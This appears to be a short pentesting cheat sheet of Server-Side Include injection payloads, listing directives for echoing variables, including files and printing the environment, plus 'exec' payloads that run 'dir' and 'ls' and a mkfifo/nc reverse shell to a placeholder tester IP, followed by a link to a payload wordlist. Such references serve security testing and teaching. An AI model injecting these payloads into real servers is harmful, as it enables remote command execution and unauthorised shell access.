```
// Document name
<!--#echo var="DOCUMENT_NAME" -->
// Date
<!--#echo var="DATE_LOCAL" -->

// File inclusion
<!--#include virtual="/index.html" -->
// Including files (same directory)
<!--#include file="file_to_include.html" -->
// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->
// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->
// Modification date of a file
<!--#flastmod file="index.html" -->

// Command exec
<!--#exec cmd="dir" -->
// Command exec
<!--#exec cmd="ls" -->
// Reverse shell
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->

// Print all variables
<!--#printenv -->
// Setting variables
<!--#set var="name" value="Rich" -->
```

==Brute Force Wordlist:== https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt
